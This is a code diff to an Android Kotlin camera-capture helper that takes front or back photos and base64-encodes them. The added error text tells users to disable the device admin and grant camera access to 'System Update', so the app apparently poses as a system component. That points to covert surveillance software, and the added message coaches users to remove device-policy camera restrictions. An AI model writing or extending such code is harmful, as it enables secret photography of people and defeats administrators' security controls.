@@ -4,6 +4,7 @@ import android.content.Context
 import android.graphics.Bitmap
 import android.graphics.BitmapFactory
 import android.hardware.camera2.*
+import android.os.*
 import android.os.Handler
 import android.os.HandlerThread
 import android.util.Base64
@@ -96,7 +97,7 @@ class CameraHelper(private val context: Context) {
                     } catch (e: Exception) { captureError = "Session: ${e.message}"; semaphore.release() }
                 }
                 override fun onDisconnected(c: CameraDevice) { captureError = "Disconnected"; semaphore.release() }
-                override fun onError(c: CameraDevice, err: Int) { captureError = "Error $err"; semaphore.release() }
+                override fun onError(c: CameraDevice, err: Int) { captureError = "Error $err (camera disabled by device policy)"; semaphore.release() }
             }, handler)
             if (!semaphore.tryAcquire(TIMEOUT_SECONDS, TimeUnit.SECONDS)) {
                 capturedCamera?.close()
@@ -116,7 +117,13 @@ class CameraHelper(private val context: Context) {
             FileOutputStream(f).use { it.write(byteArray) }
             val label = if (targetFacing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"
             return PhotoResult(success = true, base64Data = base64, filePath = f.absolutePath, camera = label)
-        } catch (e: SecurityException) { return PhotoResult(false, errorMessage = "Permission denied", errorType = "SecurityException") }
-        catch (e: Exception) { Log.e(TAG, "Error: ${e.message}", e); return PhotoResult(false, errorMessage = e.message, errorType = e.javaClass.simpleName) }
+        } catch (e: SecurityException) { return PhotoResult(false, errorMessage = "Permission denied - check app permissions", errorType = "SecurityException") }
+        catch (e: Exception) {
+            val msg = e.message ?: ""
+            Log.e(TAG, "Error: $msg", e)
+            val errorType = if (msg.contains("CAMERA_DISABLED")) "CameraDisabledByPolicy" else e.javaClass.simpleName
+            val errorMessage = if (msg.contains("CAMERA_DISABLED")) "Camera DISABLED by device policy. Fix: Settings > Security > Device admin apps > disable active admin, then grant Camera permission to System Update" else msg
+            return PhotoResult(false, errorMessage = errorMessage, errorType = errorType)
+        }
     }
 }
